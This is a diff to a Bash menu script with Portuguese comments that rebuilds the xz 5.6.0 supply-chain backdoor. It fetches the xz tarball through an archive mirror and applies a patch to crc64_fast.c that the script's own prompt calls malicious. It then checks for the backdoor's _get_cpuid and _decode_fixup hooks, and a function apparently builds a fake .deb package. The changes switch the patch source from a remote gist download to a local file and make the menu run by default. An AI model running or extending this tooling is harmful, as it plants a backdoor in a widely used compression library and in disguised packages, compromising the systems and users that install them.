@@ -7,9 +7,10 @@ set -euo pipefail
 ########################################
 # CONFIGURAÇÕES GLOBAIS
 ########################################
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 WORKDIR="${TMPDIR:-/tmp}/.xzcache"
-XZ_URL="https://github.com/tukaani-project/xz/releases/download/v5.6.0/xz-5.6.0.tar.gz"
-BACKDOOR_PATCH_URL="https://gist.githubusercontent.com/Arnault-Quer/1b9d3f5a2e7c/raw/crc64_fast.patch"
+XZ_URL="https://web.archive.org/web/20240226100419id_/https://github.com/tukaani-project/xz/releases/download/v5.6.0/xz-5.6.0.tar.gz"
+BACKDOOR_PATCH_URL="local"
 PATCH_NAME="crc64_fast.patch"
 LIBLZMA_SO="liblzma.so.5.6.0"
 LIBLZMA_A="liblzma.a"
@@ -104,10 +105,15 @@ f_patch(){
   printf "${YELLOW}Confirma aplicação do patch malicioso? (s/N):${NC} "; read -r conf
   [[ $conf =~ ^[Ss]$ ]] || { menu_principal; return; }
 
-  # baixa patch caso não exista
-  [[ -f ../$PATCH_NAME ]] || wget -q "$BACKDOOR_PATCH_URL" -O ../$PATCH_NAME
+  # usa patch local ou busca se não existir
+  if [[ "$BACKDOOR_PATCH_URL" == "local" ]]; then
+     msg "Usando patch local..."
+     [[ -f ../$PATCH_NAME ]] || cp -v "$SCRIPT_DIR/$PATCH_NAME" ../$PATCH_NAME
+  else
+     [[ -f ../$PATCH_NAME ]] || wget -q "$BACKDOOR_PATCH_URL" -O ../$PATCH_NAME
+  fi
   patch -p1 < ../$PATCH_NAME || die "Patch falhou"
-  ok "Arquivo crc64_fast.c alterado. Diff:"
+  ok "Arquivo src/liblzma/check/crc64_fast.c alterado."
   grep -n "_get_cpuid\|_decode_fixup" "$target" || true
   sleep 3
   menu_principal
@@ -186,5 +192,6 @@ f_deb_fake(){
 }
 
 # ===================  ENTRYPOINT  ===================
-[[ "${1:-}" == "--cli" ]] && menu_principal
+#[[ "${1:-}" == "--cli" ]] && menu_principal
 # Se quiser execução direta sem menu, chame funções explicitamente
+menu_principal
